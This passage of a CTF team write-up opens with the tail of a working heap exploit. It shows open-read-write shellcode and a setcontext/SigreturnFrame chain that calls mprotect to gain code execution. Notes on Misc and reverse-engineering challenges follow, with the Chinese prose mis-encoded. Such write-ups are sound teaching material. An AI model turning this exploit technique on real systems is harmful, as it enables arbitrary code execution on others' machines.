</span></span></span><span class=line><span class=cl><span class=s1>mov eax, 0
</span></span></span><span class=line><span class=cl><span class=s1>syscall
</span></span></span><span class=line><span class=cl><span class=s1>
</span></span></span><span class=line><span class=cl><span class=s1>jmp rsi
</span></span></span><span class=line><span class=cl><span class=s1>&#39;&#39;&#39;</span> <span class=o>%</span> <span class=n>new_execve_env2</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>orw</span> <span class=o>=</span> <span class=s1>&#39;&#39;&#39;
</span></span></span><span class=line><span class=cl><span class=s1>mov rax, 0x67616c662f2e ;// ./flag
</span></span></span><span class=line><span class=cl><span class=s1>push rax
</span></span></span><span class=line><span class=cl><span class=s1>
</span></span></span><span class=line><span class=cl><span class=s1>mov rdi, rsp ;// ./flag
</span></span></span><span class=line><span class=cl><span class=s1>mov rsi, 0 ;// O_RDONLY
</span></span></span><span class=line><span class=cl><span class=s1>xor rdx, rdx ;// ç½®0å°±è¡Œ
</span></span></span><span class=line><span class=cl><span class=s1>mov rax, 2 ;// SYS_open
</span></span></span><span class=line><span class=cl><span class=s1>syscall
</span></span></span><span class=line><span class=cl><span class=s1>
</span></span></span><span class=line><span class=cl><span class=s1>mov rdi, rax ;// fd 
</span></span></span><span class=line><span class=cl><span class=s1>mov rsi,rsp  ;// è¯»åˆ°æ ˆä¸Š
</span></span></span><span class=line><span class=cl><span class=s1>mov rdx, 1024 ;// nbytes
</span></span></span><span class=line><span class=cl><span class=s1>mov rax,0 ;// SYS_read
</span></span></span><span class=line><span class=cl><span class=s1>syscall
</span></span></span><span class=line><span class=cl><span class=s1>
</span></span></span><span class=line><span class=cl><span class=s1>mov rdi, 1 ;// fd 
</span></span></span><span class=line><span class=cl><span class=s1>mov rsi, rsp ;// buf
</span></span></span><span class=line><span class=cl><span class=s1>mov rdx, rax ;// count 
</span></span></span><span class=line><span class=cl><span class=s1>mov rax, 1 ;// SYS_write
</span></span></span><span class=line><span class=cl><span class=s1>syscall
</span></span></span><span class=line><span class=cl><span class=s1>
</span></span></span><span class=line><span class=cl><span class=s1>mov rdi, 0 ;// error_code
</span></span></span><span class=line><span class=cl><span class=s1>mov rax, 60
</span></span></span><span class=line><span class=cl><span class=s1>syscall
</span></span></span><span class=line><span class=cl><span class=s1>&#39;&#39;&#39;</span>
</span></span><span class=line><span class=cl><span class=n>payload1</span>  <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=n>libc_base1</span> <span class=o>+</span> <span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;setcontext&#39;</span><span class=p>]</span> <span class=o>+</span> <span class=mi>53</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>free_hook1</span> <span class=o>+</span> <span class=mh>0x10</span><span class=p>)</span> <span class=o>+</span> <span class=n>asm</span><span class=p>(</span><span class=n>shellcode1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>payload1</span> <span class=o>=</span> <span class=n>payload1</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mh>0x30</span><span class=p>,</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>frame</span> <span class=o>=</span> <span class=n>SigreturnFrame</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>frame</span><span class=o>.</span><span class=n>rsp</span> <span class=o>=</span> <span class=n>free_hook1</span> <span class=o>+</span> <span class=mi>8</span>
</span></span><span class=line><span class=cl><span class=n>frame</span><span class=o>.</span><span class=n>rip</span> <span class=o>=</span> <span class=n>libc_base1</span> <span class=o>+</span> <span class=n>libc</span><span class=o>.</span><span class=n>symbols</span><span class=p>[</span><span class=s1>&#39;mprotect&#39;</span><span class=p>]</span> <span class=c1># 0xa8 rcx</span>
</span></span><span class=line><span class=cl><span class=n>frame</span><span class=o>.</span><span class=n>rdi</span> <span class=o>=</span> <span class=n>free_hook1</span> <span class=o>&amp;</span><span class=mh>0xFFFFFFFFFFFFF000</span>
</span></span><span class=line><span class=cl><span class=n>frame</span><span class=o>.</span><span class=n>rsi</span> <span class=o>=</span> <span class=mh>0x1000</span>
</span></span><span class=line><span class=cl><span class=n>frame</span><span class=o>.</span><span class=n>rdx</span> <span class=o>=</span> <span class=mi>4</span> <span class=o>|</span> <span class=mi>2</span> <span class=o>|</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl><span class=n>payload1</span> <span class=o>+=</span> <span class=nb>str</span><span class=p>(</span><span class=n>frame</span><span class=p>)[</span><span class=mh>0x30</span><span class=p>:</span><span class=mh>0xD8</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload2</span>  <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=n>libc_base2</span> <span class=o>+</span> <span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;setcontext&#39;</span><span class=p>]</span> <span class=o>+</span> <span class=mi>53</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>free_hook2</span> <span class=o>+</span> <span class=mh>0x10</span><span class=p>)</span> <span class=o>+</span> <span class=n>asm</span><span class=p>(</span><span class=n>shellcode2</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>payload2</span> <span class=o>=</span> <span class=n>payload2</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mh>0x30</span><span class=p>,</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>frame</span> <span class=o>=</span> <span class=n>SigreturnFrame</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>frame</span><span class=o>.</span><span class=n>rsp</span> <span class=o>=</span> <span class=n>free_hook2</span> <span class=o>+</span> <span class=mi>8</span>
</span></span><span class=line><span class=cl><span class=n>frame</span><span class=o>.</span><span class=n>rip</span> <span class=o>=</span> <span class=n>libc_base2</span> <span class=o>+</span> <span class=n>libc</span><span class=o>.</span><span class=n>symbols</span><span class=p>[</span><span class=s1>&#39;mprotect&#39;</span><span class=p>]</span> <span class=c1># 0xa8 rcx</span>
</span></span><span class=line><span class=cl><span class=n>frame</span><span class=o>.</span><span class=n>rdi</span> <span class=o>=</span> <span class=n>free_hook2</span> <span class=o>&amp;</span><span class=mh>0xFFFFFFFFFFFFF000</span>
</span></span><span class=line><span class=cl><span class=n>frame</span><span class=o>.</span><span class=n>rsi</span> <span class=o>=</span> <span class=mh>0x1000</span>
</span></span><span class=line><span class=cl><span class=n>frame</span><span class=o>.</span><span class=n>rdx</span> <span class=o>=</span> <span class=mi>4</span> <span class=o>|</span> <span class=mi>2</span> <span class=o>|</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl><span class=n>payload2</span> <span class=o>+=</span> <span class=nb>str</span><span class=p>(</span><span class=n>frame</span><span class=p>)[</span><span class=mh>0x30</span><span class=p>:</span><span class=mh>0xD8</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>add_free</span><span class=p>(</span><span class=mh>0xF0</span><span class=p>,</span><span class=n>payload1</span><span class=p>,</span><span class=n>payload2</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>asm</span><span class=p>(</span><span class=n>orw</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=misc>Misc</h2><h3 id=dalabengba>Dalabengba</h3><p>å…ˆç”¨EnigmaVBUnpacker.exeå°†æ¸¸æˆè§£åŒ…
<img src=https://hackmd.summershrimp.com/uploads/upload_f40cca716ad4cccb72861350a9b79c3e.png alt>
ç„¶åå¼€å¯rpgmakerå¼€ä¸€ä¸ªæ–°é¡¹ç›®ï¼ŒæŠŠwwwé‡Œé¢æ–‡ä»¶æ‹·è¿‡å»æ‰“å¼€
<img src=https://hackmd.summershrimp.com/uploads/upload_b3e744e636152849dc783d0ff598e507.png alt>
åœ¨è¿™ä¸ªç½‘ç«™æŠŠç´ æè§£åŒ…https://petschko.org/tools/mv_decrypter/ï¼ŒæŠŠå®Œæ•´çš„æ”¾å›æ–‡ä»¶å¤¹é‡Œï¼Œè¿™é‡Œè¦ä¿®æ”¹data/system.jsonçš„é…ç½®
&ldquo;hasEncryptedImages&rdquo;: false,
&ldquo;hasEncryptedAudio&rdquo;: false,
è¿è¡Œæ­£å¸¸ä½¿ç”¨äº†
<img src=https://hackmd.summershrimp.com/uploads/upload_0280daf918a26ff67cafd0d76c9745e5.png alt>
æŸ¥æ‰¾äº†å›½ç‹æœ€åæˆåŠŸçš„è¯
<img src=https://hackmd.summershrimp.com/uploads/upload_5db1d582c9cd1710e90fd9de5e605019.png alt>
è°ƒè¯•å‘ç°è¿˜æ˜¯åŠ å¯†äº†ï¼Œç”¨äº†decText.jsé‡Œé¢ä»£ç 
å‚è€ƒ<a href="http://cache.baiducontent.com/c?m=9d78d513d98303fa4fece4215e4f80260e55f0744cd2c7647dc3923884155f563662f4cb51356704c7823c390ef50f1aa8b12173441e3df2de8d9f4aaae3c97b73c97d73671cf1104f8c04edd64727c621900cb8f81cb3eea6&amp;p=c96fc64ad48c11a058e8d6654948&amp;newp=92769a47cd8911a058e8872b445c92695c02dc3051ddd001298ffe0cc4241a1a1a3aecbb24241502d9c478610abb0f31aba7747d605f76acd1&amp;s=cfcd208495d565ef&amp;user=baidu&amp;fm=sc&amp;query=RPGMAKER%B7%C0%C6%C6%BD%E2&amp;qid=f601feaf00042d52&amp;p1=1">RPGMakeré˜²ç ´è§£ç™¾åº¦å¿«ç…§</a>
å»åˆ†ærpg_core.jsï¼Œæ¨å‡ºsystemkey:&ldquo;f74592328a168cf858e727078d4f6ab&rdquo;ï¼Œç„¶åä¸¢å›åŒ…é‡Œçœ‹å›½ç‹è¯´çš„è¯ï¼Œå…¶å®å¯ä»¥æŠŠæ‰€æœ‰å‘ç°åŠ å¯†çš„éƒ½è·‘å‡ºæ¥çœ‹çœ‹æœ‰å“ªäº›ä¸œè¥¿
<img src=https://images-cdn.shimo.im/V0etRC2WJpTzNdys__thumbnail.PNG alt>
emmå¥½åƒæ²¡flag
ç¬¬ä¸€éƒ¨åˆ†ï¼š</p><p>ç›´æ¥è·³åˆ°æœ€åçš„å¤©ç©ºåŸå…³å¡
<img src=https://hackmd.summershrimp.com/uploads/upload_44b8b47e88c65b64871b31003e28c45e.png alt>
å‘ç°ç§»åŠ¨è·¯çº¿ç»„æˆå•è¯Pr1nCe5s
ç¬¬äºŒéƒ¨åˆ†ï¼š
æ–‡ä»¶part2.jpg
å‰é¢æœ‰ä¸€ä¸ªdo you know java ï¼ŒæŸ¥äº†javaå’Œå›¾ç‰‡éšå†™çš„ä¸œè¥¿
æ‰¾æ‰“javaç›²æ°´å°å·¥å…·ï¼šhttps://github.com/ww23/BlindWatermarkï¼Œ
éœ€è¦æ‹¼æ¥ä¸€éƒ¨åˆ†ï¼Œæ‰«æå‡ºç¬¬äºŒéƒ¨åˆ†
<img src=https://hackmd.summershrimp.com/uploads/upload_66fa2c8058debf0be49712ab229dc1ad.png alt>
W@rR1or</p><p>ç¬¬ä¸‰éƒ¨åˆ†ï¼š
å‰é¢å¯¼å…¥systemkeyåä½¿ç”¨åŠ å¯†çš„ç´ æ
<img src=https://hackmd.summershrimp.com/uploads/upload_36ef3f2933fd61a8f638cbfa7bb0197a.png alt>
çœ‹åˆ°å›½ç‹çš„è¯é€†åºhex->asciiå¾—åˆ°Y0u_@re_5o_bRaVEå¾—åˆ°ä¸€ä¸ªæ–‡ä»¶
<img src=https://hackmd.summershrimp.com/uploads/upload_238ca188ca474387ad33958b4cbff3be.png alt>
æœæ–‡ä»¶ås3cr3tæ‰¾åˆ°äº†ä¸ªè§£å¯†çš„https://gist.github.com/aanoaa/1408846
å‡ºäº†WhrRrrr~
<img src=https://hackmd.summershrimp.com/uploads/upload_0d910504a7ecb5dfa598b63708415bb9.png alt></p><h3 id=xman_happy_birthday>XMAN_Happy_birthday!</h3><p>ç¿»è½¬</p><h3 id=music_game>Music_game</h3><p>å£°æ§æ¸¸æˆï¼Œèµ°åˆ°ç»ˆç‚¹å°±å‡ºflag</p><h2 id=rev>Rev</h2><h3 id=wmware>Wmware</h3><p><strong>Second Blood</strong></p><p>ä¸€ä¸ªbochs,ç£ç›˜æ–‡ä»¶,010æ‰“å¼€åçœ‹åˆ°äº†ç†Ÿæ‚‰çš„0x55AA,æ‹–å…¥ida,é€‰æ‹©16ä½.æ‰‡åŒºæ˜¯512å­—èŠ‚ä¸ºä¸€ä¸ªå•ä½,è¿™æ ·å¯ä»¥æ‰¾åˆ°ä¸€äº›ä»£ç ,ç®€å•åˆ†æäº†ä¸€ä¸‹å‘ç°æ˜¯åœ¨è¾“å…¥,å¾ªç¯ç­‰å¾…ä¸åœç­‰å¾…ç«¯å£çŠ¶æ€å˜åŒ–,ç„¶åè¯»å…¥,è¿™é‡Œè·å¾—çš„æ˜¯é”®ç›˜çš„æ‰«æç ,è½¬æˆäº†ascii,å†™åˆ°äº†æ˜¾å­˜çš„åœ°å€</p><p>ç”¨bochsè‡ªå¸¦çš„è°ƒè¯•å™¨è°ƒä¸€ä¸‹,åœ¨è¾“å…¥çš„æ—¶å€™ä¸­æ–­,è¾“å…¥çš„è·³å‡ºæ¡ä»¶æ˜¯è¯»åˆ°å›è½¦çš„æ‰«æç ,ç»§ç»­è°ƒè¯•,ç»“åˆida,å‘ç°ä»–åœ¨è¿›è¡Œä¸€ä¸ª6*6çš„å¾ªç¯,æ¯æ¬¡æ‹¿å‡ºæ¥ä¸€ä¸ªæ‰«æç .åŠ 0x55åæ”¾åˆ°å¦å¤–ä¸€ä¸ªåœ°æ–¹,æœ‰ç‚¹åƒæ …æ å¯†ç ,åé¢åˆ‡æ¢æ¨¡å¼åˆ°32ä½,è¿è¡Œä¿æŠ¤æ¨¡å¼çš„ä»£ç ,è¿™é‡Œå¯ä»¥å¼€ä¸€ä¸ª32ä½çš„ida,ç›´æ¥F5,å‘ç°å¾ªç¯xoräº†å‡ ä¸ªå¾ˆè‡­çš„å¸¸æ•°,é€‰æ‹©è‡­å¸¸æ•°çš„æ¡ä»¶æ˜¯å¾ªç¯çš„æ¬¡æ•°å–ä½™9,å…¨éƒ¨éƒ½æ˜¯xor,å†™é€†è¿ç®—è®¡ç®—å›æ¥å°±è¡Œäº†</p><h3 id=welcome-to-ctf>Welcome to CTF</h3><p>ä¸€ä¸ªwindowsé€†å‘,ä¸€å¼€å§‹è¸©å‘åˆ°äº†è™šå‡çš„æ‰§è¡Œæµ,è™šå‡çš„base64,è™šå‡çš„xor,åœ¨initçš„æ—¶å€™,è¿è¡Œäº†å¥½å¤šå‡½æ•°,å…³äºå¼‚å¸¸åè°ƒè¯•ç­‰ç­‰,è¿˜æœ‰ä¸‰å¤„è°ƒç”¨äº†ntdllé‡Œé¢çš„ä¸€ä¸ªå¯ä»¥å¯¹æŠ—è°ƒè¯•å™¨çš„å‡½æ•°.</p><p>æ—¢ç„¶è¿™æ ·,é‚£å°±ç›´æ¥ä¸Štraceäº†,æ‰‹å¤´æœ‰ä¸€ä¸ªå†™å¥½çš„å·¥å…·,é…åˆqemu,traceå‡ºäº†ä»–æ‰€æœ‰çš„æŒ‡ä»¤æµ
<img src=https://hackmd.summershrimp.com/uploads/upload_eb1e6150524146d82f47f963b35c4a87.png alt>
å‘ç°åˆ°è¿™é‡Œäº†,è·Ÿè¿›å»çœ‹äº†ä¸€ä¸‹,å’Œå‡çš„é‚£ä¸ªå‡½æ•°å·®ä¸å¤š,ç›´æ¥é€†äº†ä¸€ä¸‹,å‘ç°æœ‰ä¸€ä¸ªæ”¹äº†è¡¨çš„base64å‡½æ•°,åé¢æ˜¯å‡ ä¸ªæ˜æ˜¾çš„å¤§æ•°è®¡ç®—,è¿™é‡Œç›´æ¥patchäº†ä»–çš„ntdllé‚£ä¸ªå‡½æ•°çš„è°ƒç”¨,å¯ä»¥è°ƒè¯•äº†,åœ¨è¿›å…¥è™šå‡çš„checkå‡½æ•°æ—¶,ä¿®æ”¹eipåˆ°è¿™ä¸ªå‡½æ•°,æ‰‹åŠ¨è·³è¿‡æ¥,ç»§ç»­è°ƒè¯•</p><p>æ•´ç†å‡ºæ¥å¤§æ¦‚çš„æµç¨‹:
base64decode -> rsa -> é«˜60bitå’Œä½56bitåˆ†åˆ«åšx y,è®¡ç®—x^3 + y^3 + z^3 = 43
è¿™é‡Œçš„ä¸€ä¸ªå¸¸æ•°å€¼æ˜¯ç«‹æ–¹å’Œ=42çš„è§£,è¿™é‡Œå´è¿˜æ˜¯43,å…ˆå¸¦è¿›å»42çš„ç»“æœç”Ÿæˆä¸€ä¸‹flag,ç„¶åè·‘trace.
ç®—äº†ä¸€ä¸‹å‘ç°æ˜¯é”™çš„,ç»§ç»­è¾¹traceè¾¹æ‰“å°å†…å­˜,å‘ç°base64çš„ç»“æœå°±ä¸å¯¹äº†,ä½†æ˜¯logé‡Œè¿˜æ˜¯æœ‰é‚£ä¸ªå‡½æ•°çš„ç—•è¿¹çš„,ç»§ç»­æŸ¥log,å‘ç°åœ¨åˆå§‹åŒ–ç è¡¨å,decodeä¹‹å‰,æœ‰ä¸€ä¸ªå‡½æ•°è·³èµ°äº†.é‚£å°±æ˜¯è¿™é‡Œçš„é—®é¢˜äº†,è¯»äº†ä¸€ä¸‹ç è¡¨,å‘ç°å’Œç›´æ¥dumpå‡ºæ¥çš„ä¸ä¸€æ ·,ä¿®äº†ä¸€ä¸‹ç è¡¨,æœ€ååˆä¸€æ¬¡trace,å‘ç°å·²ç»è¾“å‡ºGOODäº†,ä¼°è®¡é‚£ä¸ª43æœ€åè¿˜æ˜¯è¢«æ”¹è¿‡,ä¸è¿‡å·²ç»å‡ºäº†å°±æ²¡ç»§ç»­traceäº†.</p><h3 id=easy_re>easy_re</h3><p><strong>Second Blood</strong></p><p>è°ƒè¯•å¾—åˆ°perlæºç </p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$flag = &#34;WMCTF{I_WAnt_dynam1c_F1ag}&#34;
</span></span><span class=line><span class=cl>print &#34;please input the flag:&#34;;
</span></span><span class=line><span class=cl>$line = &lt;STDIN&gt;;
</span></span><span class=line><span class=cl>chomp($line);
</span></span><span class=line><span class=cl>if($line eq $flag){
</span></span><span class=line><span class=cl>print &#34;congratulation!&#34;
</span></span><span class=line><span class=cl>}else{&#39;
</span></span><span class=line><span class=cl>print &#34;no,wrong&#34;&#39;
</span></span><span class=line><span class=cl>}
</span></span></code></pre></td></tr></table></div></div><h3 id=meet_in_july>Meet_in_July</h3><p><strong>First Blood</strong></p><p><img src=https://hackmd.summershrimp.com/uploads/upload_adfc7becae87af10ef6798f13fe703ee.png alt>
checkæ ¼å¼flag{}é•¿åº¦70
æ•°å­—å’Œå¤§å†™ABCDEF
<img src=https://hackmd.summershrimp.com/uploads/upload_933b2c51cb597137690981f9004ce0d5.png alt>
å­—ç¬¦ä¸²è½¬16è¿›åˆ¶åè¿›sub_401909è¿›è¡ŒåŠ å¯†
<img src=https://hackmd.summershrimp.com/uploads/upload_b0b0102d285e2209705ad6e60fcbf3dd.png alt>
ä¸»è¦æ˜¯ä¹˜æ³•å‡æ³•modä¸‰ä¸ªæ“ä½œ</p><p>å› ä¸ºsub_401111æ“ä½œç»“æœéƒ½æ˜¯32bytesï¼ŒçŒœæµ‹æ˜¯ä¸€ä¸ªå–æ¨¡æ“ä½œã€‚</p><p>ç”¨äº†ä¸¤ç»„æ•°æ®ç®—å‡ºäº†æ¨¡æ•°ï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Util.number</span> <span class=kn>import</span> <span class=n>GCD</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>inp_1</span> <span class=o>=</span> <span class=mh>0x1790fc4efe2923a51ea676027908f3670d509bd2db7d6f45e38f6dc0258697415aaff6dd5ca9006aead7b3ea053c115aabd618bcdea5ca109dab2555e8e62a566a06666b81753587d2c92fab5e0254d62320a508222420415b0cc681cdda98</span>
</span></span><span class=line><span class=cl><span class=n>out_1</span> <span class=o>=</span> <span class=n>bytes_to_long</span><span class=p>(</span><span class=nb>bytes</span><span class=p>([</span>
</span></span><span class=line><span class=cl>    <span class=mh>0xF4</span><span class=p>,</span> <span class=mh>0x56</span><span class=p>,</span> <span class=mh>0x29</span><span class=p>,</span> <span class=mh>0xCE</span><span class=p>,</span> <span class=mh>0xB3</span><span class=p>,</span> <span class=mh>0x4D</span><span class=p>,</span> <span class=mh>0x25</span><span class=p>,</span> <span class=mh>0xBD</span><span class=p>,</span> <span class=mh>0xD4</span><span class=p>,</span> <span class=mh>0xC2</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=mh>0xED</span><span class=p>,</span> <span class=mh>0xDA</span><span class=p>,</span> <span class=mh>0x01</span><span class=p>,</span> <span class=mh>0xB2</span><span class=p>,</span> <span class=mh>0x67</span><span class=p>,</span> <span class=mh>0xDF</span><span class=p>,</span> <span class=mh>0x8E</span><span class=p>,</span> <span class=mh>0xBB</span><span class=p>,</span> <span class=mh>0x5F</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=mh>0x1F</span><span class=p>,</span> <span class=mh>0x6D</span><span class=p>,</span> <span class=mh>0x5A</span><span class=p>,</span> <span class=mh>0x2F</span><span class=p>,</span> <span class=mh>0x3D</span><span class=p>,</span> <span class=mh>0x85</span><span class=p>,</span> <span class=mh>0xE8</span><span class=p>,</span> <span class=mh>0xF3</span><span class=p>,</span> <span class=mh>0x8F</span><span class=p>,</span> <span class=mh>0x45</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=mh>0xB3</span><span class=p>,</span> <span class=mh>0x6F</span><span class=p>][::</span><span class=o>-</span><span class=mi>1</span><span class=p>]))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>inp_2</span> <span class=o>=</span> <span class=n>bytes_to_long</span><span class=p>(</span><span class=nb>bytes</span><span class=p>([</span><span class=mh>0x11</span><span class=p>]</span><span class=o>*</span><span class=mi>33</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>out_2</span> <span class=o>=</span> <span class=n>bytes_to_long</span><span class=p>(</span><span class=nb>bytes</span><span class=p>([</span>
</span></span><span class=line><span class=cl>    <span class=mh>0xAC</span><span class=p>,</span> <span class=mh>0xF4</span><span class=p>,</span> <span class=mh>0x0D</span><span class=p>,</span> <span class=mh>0x11</span><span class=p>,</span> <span class=mh>0x11</span><span class=p>,</span> <span class=mh>0x11</span><span class=p>,</span> <span class=mh>0x11</span><span class=p>,</span> <span class=mh>0x11</span><span class=p>,</span> <span class=mh>0x11</span><span class=p>,</span> <span class=mh>0x11</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=mh>0x11</span><span class=p>,</span> <span class=mh>0x11</span><span class=p>,</span> <span class=mh>0x11</span><span class=p>,</span> <span class=mh>0x11</span><span class=p>,</span> <span class=mh>0x11</span><span class=p>,</span> <span class=mh>0xC1</span><span class=p>,</span> <span class=mh>0x8E</span><span class=p>,</span> <span class=mh>0x01</span><span class=p>,</span> <span class=mh>0x11</span><span class=p>,</span> <span class=mh>0x11</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=mh>0x11</span><span class=p>,</span> <span class=mh>0x11</span><span class=p>,</span> <span class=mh>0x11</span><span class=p>,</span> <span class=mh>0x11</span><span class=p>,</span> <span class=mh>0x11</span><span class=p>,</span> <span class=mh>0x11</span><span class=p>,</span> <span class=mh>0x11</span><span class=p>,</span> <span class=mh>0x11</span><span class=p>,</span> <span class=mh>0x11</span><span class=p>,</span> <span class=mh>0x11</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=mh>0x11</span><span class=p>,</span> <span class=mh>0x11</span><span class=p>][::</span><span class=o>-</span><span class=mi>1</span><span class=p>]))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>d_1</span> <span class=o>=</span> <span class=n>inp_1</span> <span class=o>-</span> <span class=n>out_1</span>
</span></span><span class=line><span class=cl><span class=n>d_2</span> <span class=o>=</span> <span class=n>inp_2</span> <span class=o>-</span> <span class=n>out_2</span>
</span></span><span class=line><span class=cl><span class=n>n</span> <span class=o>=</span> <span class=n>GCD</span><span class=p>(</span><span class=n>d_1</span><span class=p>,</span> <span class=n>d_2</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=nb>hex</span><span class=p>(</span><span class=n>n</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=c1># 0x1000000000000000000000000000000e98c3c3c3c3c3c3c3c3c3c3c3c3c3c6b15</span>
</span></span></code></pre></td></tr></table></div></div><p>é€»è¾‘å¦‚ä¸‹</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span><span class=lnt>71
</span><span class=lnt>72
</span><span class=lnt>73
</span><span class=lnt>74
</span><span class=lnt>75
</span><span class=lnt>76
</span><span class=lnt>77
</span><span class=lnt>78
</span><span class=lnt>79
</span><span class=lnt>80
</span><span class=lnt>81
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>è¾“å…¥flag{1234567812345678123456781234567812345678123456781234567812345678}
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>0xE98C3C3C3C3C3C3C3C3C3C3C3C3C3C6B15
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>0x1234567812345678123456781234567812345678123456781234567812345678
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>input*input
</span></span><span class=line><span class=cl>0x14b66dc208ba5f83fcbe5145f0c24307e4c634c9d8ca268bccce184dc0d20a0f8b69204d97652e8ba3613cc9af5d4b07bb595945c7556783d35175c1df4d840
</span></span><span class=line><span class=cl>-2
</span></span><span class=line><span class=cl>0x14b66dc208ba5f83fcbe5145f0c24307e4c634c9d8ca268bccce184dc0d20a0f8b69204d97652e8ba3613cc9af5d4b07bb595945c7556783d35175c1df4d83e
</span></span><span class=line><span class=cl>0x14b66dc208ba5f83fcbe5145f0c24307e4c634c9d8ca268bccce184dc0d20a0f8b69204d97652e8ba3613cc9af5d4b07bb595945c7556783d35175c1df4d83e*0x1234567812345678123456781234567812345678123456781234567812345678
</span></span><span class=line><span class=cl>0x1790fc4efe2923a51ea676027908f3670d509bd2db7d6f45e38f6dc0258697415aaff6dd5ca9006aead7b3ea053c115aabd618bcdea5ca109dab2555e8e62a689e5cde7db5cbad9a071fa7bd9258cce857771d1a567a98538f633e94023110
